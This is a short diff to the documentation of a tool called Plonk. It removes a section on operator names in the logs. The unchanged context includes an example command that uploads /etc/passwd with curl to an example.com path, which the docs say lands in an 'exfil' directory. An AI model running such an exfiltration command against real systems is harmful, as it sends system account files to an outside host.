@@ -25,14 +25,6 @@ curl -T /etc/passwd https://example.com/p/kittens/etc/passwd
 
 will store /etc/passwd in <plonkdir>/exfil.
 
--- names --
-Operator names and logging
-
-In Plonk's logs, an operator name is associated with every queued task.  This
-name is, by default, the name of the user running Plonk as a client, but may
-be set with ,name should the need arise.  This is handy for having multiple
-Plonk bot users using the same OS account.
-
 -- TLS ---
 TLS certificate generation
 
